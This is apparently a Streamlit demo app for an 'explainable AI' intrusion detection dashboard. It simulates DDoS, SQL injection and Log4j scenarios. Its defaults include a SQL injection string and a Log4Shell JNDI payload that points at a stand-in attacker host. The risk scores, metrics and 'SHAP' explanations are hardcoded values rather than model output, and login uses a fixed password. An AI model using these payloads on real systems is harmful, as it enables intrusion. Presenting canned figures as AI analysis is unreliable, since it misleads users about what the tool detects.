import streamlit as st
import pandas as pd
import numpy as np
import plotly.graph_objects as go
import time

# --- PAGE CONFIGURATION ---
st.set_page_config(page_title="XAI-IDS Enterprise", page_icon="🛡️", layout="wide")

# --- ADVANCED CSS ---
st.markdown("""
    <style>
    .stApp { background-color: #0b0f19; color: #e0e0e0; font-family: 'Roboto Mono', monospace; }
    .stTextInput > div > div > input, .stTextArea > div > div > textarea { 
        color: #00ff41; background-color: #000000; border: 1px solid #333; 
    }
    div.stButton > button {
        background-color: #00ff41; color: #000000; font-weight: bold; border: none; padding: 10px 20px;
    }
    div.stButton > button:hover { background-color: #00cc33; box-shadow: 0 0 15px #00ff41; }
    .stProgress > div > div > div > div { background-color: #00ff41; }
    </style>
    """, unsafe_allow_html=True)

# --- SESSION STATE ---
if 'logged_in' not in st.session_state:
    st.session_state['logged_in'] = False

# ==========================================
# 🔒 PHASE 1: LOGIN
# ==========================================
if not st.session_state['logged_in']:
    col1, col2, col3 = st.columns([1, 1, 1])
    with col2:
        st.title("🔒 DEFENSE PORTAL")
        st.markdown("`UNIT: CYBER-INTEL | CLEARANCE: LEVEL 5`")
        st.divider()
        username = st.text_input("OPERATOR ID")
        password = st.text_input("ACCESS KEY", type="password")
        
        if st.button("INITIALIZE SESSION"):
            if password == "1234":
                progress_text = "Establishing Secure Handshake..."
                my_bar = st.progress(0, text=progress_text)
                for percent_complete in range(100):
                    time.sleep(0.01)
                    my_bar.progress(percent_complete + 1)
                st.success("ACCESS GRANTED")
                time.sleep(0.5)
                st.session_state['logged_in'] = True
                st.session_state['user'] = username
                st.rerun()
            else:
                st.error("⛔ UNAUTHORIZED")

# ==========================================
# 🛡️ PHASE 2: DASHBOARD
# ==========================================
else:
    with st.sidebar:
        st.header(f"👤 {st.session_state['user'].upper()}")
        st.caption("STATUS: ONLINE")
        if st.button("TERMINATE SESSION"):
            st.session_state['logged_in'] = False
            st.rerun()
        st.divider()
        st.header("⚙️ ATTACK SIMULATOR")
        mode = st.radio("Select Scenario:", [
            "1. Normal Traffic (Baseline)",
            "2. DDoS Attack (Volumetric)",
            "3. SQL Injection (Web)",
            "4. Log4j Exploit (Advanced)"
        ])

    st.title("🛡️ XAI-IDS: THREAT ANALYSIS ENGINE")
    
    # METRICS
    m1, m2, m3, m4 = st.columns(4)
    m1.metric("System Uptime", "99.98%")
    m2.metric("Packets/Sec", "12,450", "+5%")
    m3.metric("AI Confidence", "High")
    m4.metric("Active Threads", "4")
    st.divider()

    # INPUTS
    st.subheader("1. TRAFFIC INJECTION")
    col_in1, col_in2 = st.columns([2, 1])
    
    with col_in1:
        # Default Init
        p_size = 64
        protocol = "TCP"
        payload_input = "Standard Header"
        
        if "Normal" in mode:
            st.info("ℹ️ **SCENARIO:** Simulating standard user browsing.")
            p_size = st.slider("Packet Size (Bytes)", 0, 2000, 450)
            protocol = st.selectbox("Protocol", ["TCP", "HTTP", "UDP"], index=1)
            
        elif "DDoS" in mode:
            st.warning("⚠️ **SCENARIO:** Simulating high-volume UDP flood.")
            p_size = st.slider("Packet Size (Bytes)", 0, 2000, 1500)
            protocol = st.selectbox("Protocol", ["UDP", "TCP"], index=0)
            
        elif "SQL" in mode:
            st.warning("⚠️ **SCENARIO:** Simulating malicious DB query.")
            payload_input = st.text_area("Inject Payload:", "SELECT * FROM users WHERE admin = '1' OR '1'='1'", height=100)
            p_size = 560
            protocol = "HTTP"
            
        elif "Log4j" in mode:
            st.error("🚨 **SCENARIO:** Simulating CVE-2021-44228.")
            payload_input = st.text_area("Inject Payload:", "${jndi:ldap://hacker-server.com/exploit}", height=100)
            p_size = 800
            protocol = "HTTP"

    with col_in2:
        st.write("##")
        # ADDED KEY TO PREVENT DUPLICATE ID ERROR
        if st.button("🚀 EXECUTE ANALYSIS", use_container_width=True, key="btn_execute_analysis"):
            
            with st.spinner("RUNNING DEEP PACKET INSPECTION..."):
                time.sleep(1.0)
            
            # LOGIC ENGINE
            risk_score = 0.1
            reasons = {}
            verdict = "BENIGN"
            
            if "Normal" in mode:
                risk_score = 0.12
                verdict = "BENIGN (Safe)"
                reasons = {"Packet Size": -0.4, "Protocol": -0.2}
            elif "DDoS" in mode:
                risk_score = 0.96
                verdict = "MALICIOUS (DDoS)"
                if p_size > 1000: reasons = {"Packet Size": 0.85, "Protocol (UDP)": 0.50}
                else: risk_score = 0.6; reasons = {"Protocol (UDP)": 0.50}
            elif "SQL" in mode:
                if "OR" in payload_input or "'" in payload_input:
                    risk_score = 0.89
                    verdict = "MALICIOUS (SQLi)"
                    reasons = {"Syntax 'OR 1=1'": 0.92, "Special Chars": 0.60}
                else:
                    risk_score = 0.2
                    verdict = "BENIGN"
                    reasons = {"Text Content": -0.5}
            elif "Log4j" in mode:
                if "${jndi:" in payload_input:
                    risk_score = 0.99
                    verdict = "CRITICAL (Log4Shell)"
                    reasons = {"Token '${jndi'": 0.98, "Protocol 'ldap'": 0.90}
                else:
                    risk_score = 0.15
                    verdict = "BENIGN"
                    reasons = {"Standard Syntax": -0.5}

            # RESULTS
            st.divider()
            if risk_score > 0.5:
                st.toast(f"⚠️ THREAT DETECTED: {verdict}", icon="🔥")
                st.error(f"🚨 ALERT: {verdict}")
            else:
                st.toast("System Secure.", icon="🛡️")
                st.success(f"✅ TRAFFIC CLEARED: {verdict}")

            c1, c2 = st.columns([1, 2])
            with c1:
                st.subheader("AI CONFIDENCE")
                color = "red" if risk_score > 0.5 else "#00ff41"
                st.markdown(f"""<div style="font-size: 45px; color: {color}; font-weight: bold;">{int(risk_score*100)}%</div>""", unsafe_allow_html=True)
                st.progress(risk_score)
            with c2:
                st.subheader("XAI EXPLANATION (SHAP)")
                
                features = list(reasons.keys())
                values = list(reasons.values())
                colors = ['#ff4b4b' if v > 0 else '#00ff41' for v in values]
                
                fig = go.Figure(go.Bar(
                    x=values, y=features, orientation='h',
                    marker=dict(color=colors)
                ))
                fig.update_layout(
                    plot_bgcolor='rgba(0,0,0,0)', paper_bgcolor='rgba(0,0,0,0)',
                    font=dict(color='#e0e0e0'),
                    xaxis=dict(range=[-1, 1]), margin=dict(l=0, r=0, t=0, b=0), height=250
                )
                st.plotly_chart(fig, use_container_width=True)
